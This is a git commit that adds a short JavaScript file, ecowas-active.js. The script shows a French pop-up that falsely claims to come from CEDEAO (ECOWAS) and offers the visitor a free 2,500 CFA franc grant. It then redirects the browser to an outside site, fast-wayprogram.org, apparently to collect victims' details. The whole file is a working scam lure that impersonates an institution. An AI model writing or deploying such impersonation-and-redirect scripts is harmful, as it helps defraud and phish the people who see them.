356127df08b68528c5e62724d0eb9683fe226a7d
superblog1 <imohette4@gmail.com>
2025-01-29 15:23:43 +0100

    Create ecowas-active.js

---
+++ ecowas-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLIQUER'
+password=prompt('CEDEAO: Félicitations, vous avez été sélectionné pour recevoir une subvention de soutien financier gratuite de 2 500 francs CFA. , Veuillez appuyer sur OK pour soumettre la candidature   ','APPLIQUER');
+if (password != 'APPLIQUER') {
+location.href='https://fast-wayprogram.org/cedeao.html';
+}
